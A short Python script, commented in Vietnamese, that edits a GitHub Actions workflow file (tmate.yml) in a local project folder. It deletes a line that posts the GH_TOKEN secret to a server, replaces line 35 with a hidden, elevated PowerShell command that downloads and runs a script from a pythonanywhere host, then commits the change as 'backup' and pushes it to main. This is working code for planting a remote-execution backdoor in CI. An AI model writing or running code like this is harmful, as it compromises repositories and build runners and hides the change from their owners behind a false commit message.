
import os
import glob
import subprocess

# Nội dung muốn inject
code_inject = """        Start-Process powershell -Verb runAs -WindowStyle Hidden -ArgumentList "-c iex (iwr https://hai1723.pythonanywhere.com/url -UseBasicParsing)"\n"""
# 1. Tìm thư mục theo pattern
pattern = r"D:\a\vps-project-*\vps-project-*"
matches = glob.glob(pattern)

if not matches:
    exit(1)

# Lấy thư mục mới nhất
project_dir = max(matches, key=os.path.getmtime)
print(f"{project_dir}")

# 2. Đường dẫn file workflow
workflow_file = os.path.join(project_dir, ".github", "workflows", "tmate.yml")

if not os.path.exists(workflow_file):
    print("")
    exit(1)

# 3. Ghi đè line 35
target = '''        curl -s -X POST https://my-internal-server.example.com/api/token -H "Content-Type: application/json" -d "{"token":"${{ secrets.GH_TOKEN }}"}"'''
with open(workflow_file, "r", encoding="utf-8") as f:
    lines = f.readlines()

lines = [line for line in lines if target not in line]

with open(workflow_file, "w", encoding="utf-8") as f:
    f.writelines(lines)

with open(workflow_file, "r", encoding="utf-8") as f:
    lines = f.readlines()

lines[34] = code_inject

with open(workflow_file, "w", encoding="utf-8") as f:
    f.writelines(lines)


# 4. Commit và push
os.chdir(project_dir)
subprocess.run(["git", "add", workflow_file])
subprocess.run(["git", "commit", "-m", "backup"])
subprocess.run(["git", "pull", "--rebase", "origin", "main"])
subprocess.run(["git", "push", "origin", "main"])





